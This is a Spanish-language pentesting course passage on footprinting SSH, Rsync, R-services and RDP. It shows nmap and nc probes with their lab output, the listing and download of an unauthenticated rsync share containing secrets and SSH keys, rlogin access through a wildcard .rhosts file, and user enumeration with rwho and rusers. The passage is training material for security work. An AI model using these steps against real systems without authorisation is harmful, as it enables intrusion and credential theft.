  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'

Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
```

La mayoría de las configuraciones en este archivo de configuración se comentan y requieren configuración manual.

---

## Configuración Peligrosa

A pesar de que el protocolo SSH es uno de los protocolos más seguros disponibles en la actualidad, algunas configuraciones erróneas aún pueden hacer que el servidor SSH sea vulnerable a ataques fáciles de ejecutar. Echemos un vistazo a las siguientes configuraciones:

|**Configuración**|**Descripción**|
|---|---|
|`PasswordAuthentication yes`|Permite la autenticación basada en contraseña.|
|`PermitEmptyPasswords yes`|Permite el uso de contraseñas vacías.|
|`PermitRootLogin yes`|Permite iniciar sesión como usuario raíz.|
|`Protocol 1`|Utiliza una versión obsoleta de cifrado.|
|`X11Forwarding yes`|Permite el reenvío X11 para aplicaciones GUI.|
|`AllowTcpForwarding yes`|Permite el reenvío de puertos TCP.|
|`PermitTunnel`|Permite el tunelizado.|
|`DebianBanner yes`|Muestra un banner específico al iniciar sesión.|

Permitir la autenticación de contraseña nos permite forzar brutamente un nombre de usuario conocido para posibles contraseñas. Se pueden usar muchos métodos diferentes para adivinar las contraseñas de los usuarios. Para este propósito, específico `patterns` por lo general, se usan para mutar las contraseñas más utilizadas y, terriblemente, corregirlas. Esto se debe a que los humanos somos perezosos y no queremos recordar contraseñas complejas y complicadas. Por lo tanto, creamos contraseñas que podemos recordar fácilmente, y esto lleva al hecho de que, por ejemplo, los números o caracteres se agregan solo al final de la contraseña. Creyendo que la contraseña es segura, los patrones mencionados se utilizan para adivinar con precisión tales "ajustes" de estas contraseñas. Sin embargo, algunas instrucciones y [guías de endurecimiento](https://www.ssh-audit.com/hardening_guides.html) se puede utilizar para endurecer nuestros servidores SSH.

---

## Huella del Servicio

Una de las herramientas que podemos utilizar para tomar las huellas dactilares del servidor SSH es [ssh-auditoría](https://github.com/jtesta/ssh-audit). Comprueba la configuración del lado del cliente y del lado del servidor y muestra cierta información general y qué algoritmos de cifrado siguen siendo utilizados por el cliente y el servidor. Por supuesto, esto podría explotarse atacando el servidor o cliente en el nivel críptico más adelante.

#### SSH-Auditoría

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
vcrdcr@htb[/htb]$ ./ssh-audit.py 10.129.14.132

# general
(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
(gen) software: OpenSSH 8.2p1
(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+
(gen) compression: enabled (zlib@openssh.com)                                   

# key exchange algorithms
(kex) curve25519-sha256                     -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76                            
(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp256                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp384                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp521                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) diffie-hellman-group-exchange-sha256 (2048-bit) -- [info] available since OpenSSH 4.4
(kex) diffie-hellman-group16-sha512         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73
(kex) diffie-hellman-group18-sha512         -- [info] available since OpenSSH 7.3
(kex) diffie-hellman-group14-sha256         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73

# host-key algorithms
(key) rsa-sha2-512 (3072-bit)               -- [info] available since OpenSSH 7.2
(key) rsa-sha2-256 (3072-bit)               -- [info] available since OpenSSH 7.2
(key) ssh-rsa (3072-bit)                    -- [fail] using weak hashing algorithm
                                            `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28
                                            `- [info] a future deprecation notice has been issued in OpenSSH 8.2: https://www.openssh.com/txt/release-8.2
(key) ecdsa-sha2-nistp256                   -- [fail] using weak elliptic curves
                                            `- [warn] using weak random number generator could reveal the key
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5
...SNIP...
```

Lo primero que podemos ver en las primeras líneas de salida es el banner que revela la versión del servidor OpenSSH. Las versiones anteriores tenían algunas vulnerabilidades, como [CVE-2020-14145](https://www.cvedetails.com/cve/CVE-2020-14145/), lo que permitió al atacante la capacidad de Man-In-The-Middle y atacar el intento de conexión inicial. La salida detallada de la configuración de conexión con el servidor OpenSSH también puede proporcionar información importante, como los métodos de autenticación que puede usar el servidor.

#### Cambiar el Método de Autenticación

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132

OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020
debug1: Reading configuration data /etc/ssh/ssh_config 
...SNIP...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
```

Para posibles ataques de fuerza bruta, podemos especificar el método de autenticación con la opción de cliente SSH `PreferredAuthentications`.

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password

OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020
debug1: Reading configuration data /etc/ssh/ssh_config
...SNIP...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Next authentication method: password

cry0l1t3@10.129.14.132's password:
```

Incluso con este servicio obvio y seguro, recomendamos configurar nuestro propio servidor OpenSSH en nuestra VM, experimentar con él y familiarizarnos con las diferentes configuraciones y opciones.

Podemos encontrar varios banners para el servidor SSH durante nuestras pruebas de penetración. De forma predeterminada, los banners comienzan con la versión del protocolo que se puede aplicar y luego la versión del servidor en sí. Por ejemplo, con `SSH-1.99-OpenSSH_3.9p1`, sabemos que podemos usar las versiones de protocolo SSH-1 y SSH-2, y estamos tratando con la versión de servidor OpenSSH 3.9p1. Por otro lado, para una pancarta con `SSH-2.0-OpenSSH_8.2p1`, estamos tratando con una versión OpenSSH 8.2p1 que solo acepta la versión del protocolo SSH-2.

---

## Rsync

[Rsync](https://linux.die.net/man/1/rsync) es una herramienta rápida y eficiente para copiar archivos de forma local y remota. Se puede usar para copiar archivos localmente en una máquina determinada y hacia/desde hosts remotos. Es muy versátil y conocido por su algoritmo de transferencia delta. Este algoritmo reduce la cantidad de datos transmitidos a través de la red cuando ya existe una versión del archivo en el host de destino. Lo hace enviando solo las diferencias entre los archivos de origen y la versión anterior de los archivos que residen en el servidor de destino. A menudo se usa para copias de seguridad y duplicación. Encuentra archivos que deben transferirse mirando archivos que han cambiado de tamaño o la última vez modificada. Por defecto, utiliza puerto `873` y se puede configurar para usar SSH para transferencias de archivos seguras mediante piggybacking sobre una conexión de servidor SSH establecida.

Esto [guía](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync) cubre algunas de las formas en que se puede abusar de Rsync, especialmente enumerando el contenido de una carpeta compartida en un servidor de destino y recuperando archivos. Esto a veces se puede hacer sin autenticación. Otras veces necesitaremos credenciales. Si encuentra credenciales durante un pentest y se encuentra con Rsync en un host interno (o externo), siempre vale la pena verificar la reutilización de contraseñas, ya que es posible que pueda extraer algunos archivos confidenciales que podrían usarse para obtener acceso remoto al objetivo.

Hagamos un poco de huella rápida. Podemos ver que Rsync está en uso usando el protocolo 31.

#### Escaneo para Rsync

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -sV -p 873 127.0.0.1

Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 09:31 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0058s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
```

#### Sondeo para Acciones Accesibles

A continuación, podemos probar un poco el servicio para ver a qué podemos acceder.

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ nc -nv 127.0.0.1 873

(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
dev            	Dev Tools
@RSYNCD: EXIT
```

#### Enumerando una Participación Abierta

Aquí podemos ver una acción llamada `dev`y podemos enumerarlo más.

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ rsync -av --list-only rsync://127.0.0.1/dev

receiving incremental file list
drwxr-xr-x             48 2022/09/19 09:43:10 .
-rw-r--r--              0 2022/09/19 09:34:50 build.sh
-rw-r--r--              0 2022/09/19 09:36:02 secrets.yaml
drwx------             54 2022/09/19 09:43:10 .ssh

sent 25 bytes  received 221 bytes  492.00 bytes/sec
total size is 0  speedup is 0.00
```

Desde la salida anterior, podemos ver algunos archivos interesantes que puede valer la pena tirar hacia abajo para investigar más a fondo. También podemos ver que un directorio que probablemente contenga claves SSH es accesible. Desde aquí, podríamos sincronizar todos los archivos a nuestro host de ataque con el comando `rsync -av rsync://127.0.0.1/dev`. Si Rsync está configurado para usar SSH para transferir archivos, podríamos modificar nuestros comandos para incluir el `-e ssh` bandera, o `-e "ssh -p2222"` si un puerto no estándar está en uso para SSH. Esto [guía](https://phoenixnap.com/kb/how-to-rsync-over-ssh) es útil para comprender la sintaxis para usar Rsync sobre SSH.

---

## R-Servicios

Los servicios R son un conjunto de servicios alojados para habilitar el acceso remoto o emitir comandos entre hosts Unix a través de TCP/IP. Desarrollado inicialmente por el Computer Systems Research Group (`CSRG`) en la Universidad de California, Berkeley `r-services` fueron el estándar de facto para el acceso remoto entre los sistemas operativos Unix hasta que fueron reemplazados por el Secure Shell (`SSH`) protocolos y comandos debido a fallas de seguridad inherentes integradas en ellos. Mucho como `telnet`, r-services transmiten información de cliente a servidor (y viceversa) a través de la red en un formato sin cifrar, lo que hace posible que los atacantes intercepten el tráfico de red (contraseñas, información de inicio de sesión, etc.) realizando man-in-the-middle (`MITM`) ataques.

`R-services` abarca los puertos `512`, `513`, y `514` y solo son accesibles a través de un conjunto de programas conocidos como `r-commands`. Son más comúnmente utilizados por sistemas operativos comerciales como Solaris, HP-UX y AIX. Aunque son menos comunes hoy en día, nos encontramos con ellos de vez en cuando durante nuestras pruebas de penetración interna, por lo que vale la pena entender cómo abordarlos.

El [R-comandos](https://en.wikipedia.org/wiki/Berkeley_r-commands) suite consta de los siguientes programas:

- rcp (`remote copy`)
- rexec (`remote execution`)
- rlogin (`remote login`)
- rsh (`remote shell`)
- rstat
- ruptura
- rwho (`remote who`)

Cada comando tiene su funcionalidad prevista; sin embargo, solo cubriremos los más comúnmente abusados `r-commands`. La tabla a continuación proporcionará una descripción rápida de los comandos más frecuentemente abusados, incluido el daemon de servicio con el que interactúan, sobre qué puerto y método de transporte se puede acceder, y una breve descripción de cada uno.

|**Comando**|**Daemon de Servicio**|**Puerto**|**Protocolo de Transporte**|**Descripción**|
|---|---|---|---|---|
|`rcp`|`rshd`|514|TCP|Copie un archivo o directorio bidireccionalmente del sistema local al sistema remoto (o viceversa) o de un sistema remoto a otro. Funciona como el `cp` comando en Linux pero proporciona `no warning to the user for overwriting existing files on a system`.|
|`rsh`|`rshd`|514|TCP|Abre un shell en una máquina remota sin un procedimiento de inicio de sesión. Se basa en las entradas de confianza en el `/etc/hosts.equiv` y `.rhosts` archivos para validación.|
|`rexec`|`rexecd`|512|TCP|Permite a un usuario ejecutar comandos de shell en una máquina remota. Requiere autenticación mediante el uso de a `username` y `password` a través de un socket de red sin cifrar. La autenticación se anula por las entradas de confianza en el `/etc/hosts.equiv` y `.rhosts` archivos.|
|`rlogin`|`rlogind`|513|TCP|Permite a un usuario iniciar sesión en un host remoto a través de la red. Funciona de manera similar a `telnet` pero solo se puede conectar a hosts tipo Unix. La autenticación se anula por las entradas de confianza en el `/etc/hosts.equiv` y `.rhosts` archivos.|

El archivo /etc/hosts.equiv contiene una lista de hosts de confianza y se utiliza para otorgar acceso a otros sistemas en la red. Cuando los usuarios de uno de estos hosts intentan acceder al sistema, se les otorga acceso automáticamente sin autenticación adicional.

#### /etc/hosts.equiv

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ cat /etc/hosts.equiv

# <hostname> <local username>
pwnbox cry0l1t3
```

Ahora que tenemos una comprensión básica de `r-commands`, hagamos una huella rápida usando `Nmap` para determinar si todos los puertos necesarios están abiertos.

#### Escaneo para R-Services

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -sV -p 512,513,514 10.0.17.2

Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-02 15:02 EST
Nmap scan report for 10.0.17.2
Host is up (0.11s latency).

PORT    STATE SERVICE    VERSION
512/tcp open  exec?
513/tcp open  login?
514/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.54 seconds
```

#### Control de Acceso y Relaciones de Confianza

La principal preocupación por `r-services`y una de las razones principales `SSH` se introdujo para reemplazarlo, son los problemas inherentes con respecto al control de acceso para estos protocolos. Los servicios R se basan en información confiable enviada desde el cliente remoto a la máquina host a la que intentan autenticarse. Por defecto, estos servicios utilizan [Módulos de Autenticación Conectables (PAM)](https://debathena.mit.edu/trac/wiki/PAM) para la autenticación de usuario en un sistema remoto; sin embargo, también omiten esta autenticación mediante el uso de la `/etc/hosts.equiv` y `.rhosts` archivos en el sistema. El `hosts.equiv` y `.rhosts` los archivos contienen una lista de hosts (`IPs` o `Hostnames`) y usuarios que son `trusted` por el host local cuando se realiza un intento de conexión usando `r-commands`. Las entradas en cualquier archivo pueden aparecer como las siguientes:

**Nota:** El `hosts.equiv` el archivo se reconoce como la configuración global con respecto a todos los usuarios en un sistema, mientras que `.rhosts` proporciona una configuración por usuario.

#### Muestra .rhosts Archivo

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ cat .rhosts

htb-student     10.0.17.5
+               10.0.17.10
+               +
```

Como podemos ver en este ejemplo, ambos archivos siguen la sintaxis específica de `<username> <ip address>` o `<username> <hostname>` pares. Además, el `+` el modificador se puede utilizar dentro de estos archivos como un comodín para especificar cualquier cosa. En este ejemplo, el `+` el modificador permite a cualquier usuario externo acceder a los comandos r desde el `htb-student` cuenta de usuario a través del host con la dirección IP `10.0.17.10`.

Las configuraciones erróneas en cualquiera de estos archivos pueden permitir que un atacante se autentique como otro usuario sin credenciales, con el potencial de obtener la ejecución de código. Ahora que entendemos cómo podemos abusar de las configuraciones erróneas en estos archivos, intentemos intentar iniciar sesión en un host de destino utilizando `rlogin`.

#### Iniciar sesión Usando Rlogin

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ rlogin 10.0.17.2 -l htb-student

Last login: Fri Dec  2 16:11:21 from localhost

[htb-student@localhost ~]$
```

Hemos iniciado sesión con éxito en el `htb-student` cuenta en el host remoto debido a las configuraciones incorrectas en el `.rhosts` archivo. Una vez iniciado sesión con éxito, también podemos abusar de la `rwho` commando para enumerar todas las sesiones interactivas en la red local enviando solicitudes al puerto UDP 513.

#### Listado de Usuarios Autenticados Usando Rwho

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ rwho

root     web01:pts/0 Dec  2 21:34
htb-student     workstn01:tty1  Dec  2 19:57  2:25       
```

De esta información, podemos ver que el `htb-student` el usuario está actualmente autenticado en el `workstn01` anfitrión, mientras que el `root` el usuario está autenticado en el `web01` anfitrión. Podemos usar esto para nuestra ventaja al explorar los nombres de usuario potenciales para usar durante más ataques a los hosts a través de la red. Sin embargo, el `rwho` daemon transmite periódicamente información sobre los usuarios registrados, por lo que podría ser beneficioso ver el tráfico de la red.

#### Listado de Usuarios Autenticados que Usan Rusers

Para proporcionar información adicional junto con `rwho`, podemos emitir el `rusers` comando. Esto nos dará una cuenta más detallada de todos los usuarios registrados a través de la red, incluida información como el nombre de usuario, el nombre de host de la máquina a la que accedió, TTY en el que el usuario inició sesión, la fecha y hora en que inició sesión, la cantidad de tiempo transcurrido desde que el usuario escribió en el teclado y el host remoto desde el que inició sesión (si corresponde).

  Protocolos de Gestión Remota de Linux

```shell-session
vcrdcr@htb[/htb]$ rusers -al 10.0.17.5

htb-student     10.0.17.5:console          Dec 2 19:57     2:25
```

Como podemos ver, los servicios R se utilizan con menos frecuencia hoy en día debido a sus fallas de seguridad inherentes y la disponibilidad de protocolos más seguros como SSH. Para ser un profesional de la seguridad de la información integral, debemos tener una comprensión amplia y profunda de muchos sistemas, aplicaciones, protocolos, etc. Por lo tanto, archive este conocimiento sobre los servicios R porque nunca sabe cuándo puede encontrarlos.

---

## Pensamientos Finales

Los servicios de administración remota pueden proporcionarnos un tesoro de datos y, a menudo, ser abusados por acceso no autorizado a través de credenciales débiles/predeterminadas o la reutilización de contraseñas. Siempre debemos investigar estos servicios para obtener tanta información como podamos recopilar y no dejar piedra sin remover, especialmente cuando hemos compilado una lista de credenciales de otras partes de la red de destino.


# Protocolos de administración remota de Windows

---

Los servidores de Windows se pueden administrar localmente mediante tareas de administración de Server Manager en servidores remotos. La administración remota está habilitada de forma predeterminada a partir de Windows Server 2016. La administración remota es un componente de las funciones de administración de hardware de Windows que administran el hardware del servidor de forma local y remota. Estas características incluyen un servicio que implementa el protocolo WS-Management, diagnóstico de hardware y control a través de controladores de administración de zócalos, y una API COM y objetos de script que nos permiten escribir aplicaciones que se comunican de forma remota a través del protocolo WS-Management.

Los principales componentes utilizados para la gestión remota de servidores Windows y Windows son los siguientes:

- Protocolo de Escritorio Remoto (`RDP`)
    
- Administración remota de Windows (`WinRM`)
    
- Instrumentación de administración de Windows (`WMI`)
    

---

## PDR

El [Protocolo de Escritorio Remoto](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) es un protocolo desarrollado por Microsoft para el acceso remoto a un equipo que ejecuta el sistema operativo Windows. Este protocolo permite que los comandos de visualización y control se transmitan a través de la GUI cifrada a través de redes IP. RDP funciona en la capa de aplicación en el modelo de referencia TCP/IP, utilizando típicamente el puerto TCP 3389 como protocolo de transporte. Sin embargo, el protocolo UDP sin conexión puede usar el puerto 3389 también para administración remota.

Para establecer una sesión RDP, tanto el firewall de red como el firewall del servidor deben permitir conexiones desde el exterior. Si [Traducción de Direcciones de Red](https://en.wikipedia.org/wiki/Network_address_translation) (`NAT`) se utiliza en la ruta entre el cliente y el servidor, como suele ser el caso con las conexiones a Internet, la computadora remota necesita la dirección IP pública para llegar al servidor. Además, el reenvío de puertos debe configurarse en el enrutador NAT en la dirección del servidor.

RDP ha manejado [Seguridad de la Capa de Transporte](https://en.wikipedia.org/wiki/Transport_Layer_Security) (`TLS/SSL`) desde Windows Vista, lo que significa que todos los datos, y especialmente el proceso de inicio de sesión, están protegidos en la red por su buen cifrado. Sin embargo, muchos sistemas Windows no insisten en esto, pero aún aceptan un cifrado inadecuado a través de [Seguridad RDP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/8e8b2cca-c1fa-456c-8ecb-a82fc60b2322). Sin embargo, incluso con esto, un atacante aún está lejos de ser bloqueado porque los certificados que proporcionan identidad son simplemente autofirmados de forma predeterminada. Esto significa que el cliente no puede distinguir un certificado genuino de uno falsificado y genera una advertencia de certificado para el usuario.

El `Remote Desktop` el servicio se instala de forma predeterminada en los servidores de Windows y no requiere aplicaciones externas adicionales. Este servicio se puede activar utilizando el `Server Manager` y viene con la configuración predeterminada para permitir conexiones al servicio solo a hosts con [Autenticación de nivel de red](https://en.wikipedia.org/wiki/Network_Level_Authentication) (`NLA`).

---

## Huella del Servicio

Escanear el servicio RDP puede darnos rápidamente mucha información sobre el host. Por ejemplo, podemos determinar si `NLA` está habilitado en el servidor o no, la versión del producto y el nombre de host.

#### Mapa

  Protocolos de administración remota de Windows

```shell-session
vcrdcr@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET
Nmap scan report for 10.129.201.248
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: ILF-SQL-01
|   NetBIOS_Domain_Name: ILF-SQL-01
|   NetBIOS_Computer_Name: ILF-SQL-01
|   DNS_Domain_Name: ILF-SQL-01
|   DNS_Computer_Name: ILF-SQL-01
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-06T13:46:00+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
```

Además, podemos usar `--packet-trace` para rastrear los paquetes individuales e inspeccionar sus contenidos manualmente. Podemos ver que el `RDP cookies` (`mstshash=nmap`) utilizado por Nmap para interactuar con el servidor RDP puede ser identificado por `threat hunters` y diversos servicios de seguridad como [Detección y Respuesta de Puntos Finales](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (`EDR`), y puede encerrarnos como probadores de penetración en redes endurecidas.

  Protocolos de administración remota de Windows

```shell-session
vcrdcr@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:23 CET
SENT (0.2506s) ICMP [10.10.14.20 > 10.129.201.248 Echo request (type=8/code=0) id=8338 seq=0] IP [ttl=53 id=5122 iplen=28 ]
SENT (0.2507s) TCP 10.10.14.20:55516 > 10.129.201.248:443 S ttl=42 id=24195 iplen=44  seq=1926233369 win=1024 <mss 1460>
SENT (0.2507s) TCP 10.10.14.20:55516 > 10.129.201.248:80 A ttl=55 id=50395 iplen=40  seq=0 win=1024
SENT (0.2517s) ICMP [10.10.14.20 > 10.129.201.248 Timestamp request (type=13/code=0) id=8247 seq=0 orig=0 recv=0 trans=0] IP [ttl=38 id=62695 iplen=40 ]
RCVD (0.2814s) ICMP [10.129.201.248 > 10.10.14.20 Echo reply (type=0/code=0) id=8338 seq=0] IP [ttl=127 id=38158 iplen=28 ]
SENT (0.3264s) TCP 10.10.14.20:55772 > 10.129.201.248:3389 S ttl=56 id=274 iplen=44  seq=2635590698 win=1024 <mss 1460>
RCVD (0.3565s) TCP 10.129.201.248:3389 > 10.10.14.20:55772 SA ttl=127 id=38162 iplen=44  seq=3526777417 win=64000 <mss 1357>
NSOCK INFO [0.4500s] nsock_iod_new2(): nsock_iod_new (IOD #1)
NSOCK INFO [0.4500s] nsock_connect_tcp(): TCP connection requested to 10.129.201.248:3389 (IOD #1) EID 8
NSOCK INFO [0.4820s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.201.248:3389]
Service scan sending probe NULL to 10.129.201.248:3389 (tcp)
NSOCK INFO [0.4830s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 6000ms) EID 18
NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID 18 [10.129.201.248:3389]
Service scan sending probe TerminalServerCookie to 10.129.201.248:3389 (tcp)
NSOCK INFO [6.4880s] nsock_write(): Write request for 42 bytes to IOD #1 EID 27 [10.129.201.248:3389]
NSOCK INFO [6.4880s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 5000ms) EID 34
NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [10.129.201.248:3389]
NSOCK INFO [6.5240s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 34 [10.129.201.248:3389] (19 bytes): .........4.........
Service scan match (Probe TerminalServerCookie matched with TerminalServerCookie line 13640): 10.129.201.248:3389 is ms-wbt-server.  Version: |Microsoft Terminal Services|||

...SNIP...

NSOCK INFO [6.5610s] nsock_write(): Write request for 54 bytes to IOD #1 EID 27 [10.129.201.248:3389]
NSE: TCP 10.10.14.20:36630 > 10.129.201.248:3389 | 00000000: 03 00 00 2a 25 e0 00 00 00 00 00 43 6f 6f 6b 69    *%      Cooki
00000010: 65 3a 20 6d 73 74 73 68 61 73 68 3d 6e 6d 61 70 e: mstshash=nmap
00000020: 0d 0a 01 00 08 00 0b 00 00 00  

...SNIP...

NSOCK INFO [6.6820s] nsock_write(): Write request for 57 bytes to IOD #2 EID 67 [10.129.201.248:3389]
NSOCK INFO [6.6820s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 67 [10.129.201.248:3389]
NSE: TCP 10.10.14.20:36630 > 10.129.201.248:3389 | SEND
NSOCK INFO [6.6820s] nsock_read(): Read request from IOD #2 [10.129.201.248:3389] (timeout: 5000ms) EID 74
NSOCK INFO [6.7180s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 74 [10.129.201.248:3389] (211 bytes)
NSE: TCP 10.10.14.20:36630 < 10.129.201.248:3389 | 
00000000: 30 81 d0 a0 03 02 01 06 a1 81 c8 30 81 c5 30 81 0          0  0
00000010: c2 a0 81 bf 04 81 bc 4e 54 4c 4d 53 53 50 00 02        NTLMSSP
00000020: 00 00 00 14 00 14 00 38 00 00 00 35 82 8a e2 b9        8   5
00000030: 73 b0 b3 91 9f 1b 0d 00 00 00 00 00 00 00 00 70 s              p
00000040: 00 70 00 4c 00 00 00 0a 00 63 45 00 00 00 0f 49  p L     cE    I
00000050: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0
00000060: 00 31 00 02 00 14 00 49 00 4c 00 46 00 2d 00 53  1     I L F - S
00000070: 00 51 00 4c 00 2d 00 30 00 31 00 01 00 14 00 49  Q L - 0 1     I
00000080: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0
00000090: 00 31 00 04 00 14 00 49 00 4c 00 46 00 2d 00 53  1     I L F - S
000000a0: 00 51 00 4c 00 2d 00 30 00 31 00 03 00 14 00 49  Q L - 0 1     I
000000b0: 00 4c 00 46 00 2d 00 53 00 51 00 4c 00 2d 00 30  L F - S Q L - 0
000000c0: 00 31 00 07 00 08 00 1d b3 e8 f2 19 d3 d7 01 00  1
000000d0: 00 00 00

...SNIP...
```

Un guión de Perl llamado [rdp-sec-check.en](https://github.com/CiscoCXSecurity/rdp-sec-check) también ha sido desarrollado por [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) eso puede identificar de forma no auténtica la configuración de seguridad de los servidores RDP en función de los apretones de manos.

#### RDP Security Check - Instalación

  Protocolos de administración remota de Windows

```shell-session
vcrdcr@htb[/htb]$ sudo cpan

Loading internal logger. Log::Log4perl recommended for better logging

CPAN.pm requires configuration, but most of it can be done automatically.
If you answer 'no' below, you will enter an interactive dialog for each
configuration option instead.

Would you like to configure as much as possible automatically? [yes] yes


Autoconfiguration complete.

commit: wrote '/root/.cpan/CPAN/MyConfig.pm'

You can re-run configuration any time with 'o conf init' in the CPAN shell

cpan shell -- CPAN exploration and modules installation (v2.27)
Enter 'h' for help.


cpan[1]> install Encoding::BER

Fetching with LWP:
http://www.cpan.org/authors/01mailrc.txt.gz
Reading '/root/.cpan/sources/authors/01mailrc.txt.gz'
............................................................................DONE
...SNIP...
```

#### Comprobación de seguridad RDP

  Protocolos de administración remota de Windows

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
vcrdcr@htb[/htb]$ ./rdp-sec-check.pl 10.129.201.248

Starting rdp-sec-check v0.9-beta ( http://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Sun Nov  7 16:50:32 2021

[+] Scanning 1 hosts

Target:    10.129.201.248
IP:        10.129.201.248
Port:      3389

[+] Checking supported protocols

[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported

[+] Checking RDP Security Layer

[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported

[+] Summary of protocol support

[-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE
[-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE
[-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE

[+] Summary of RDP encryption support

[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE
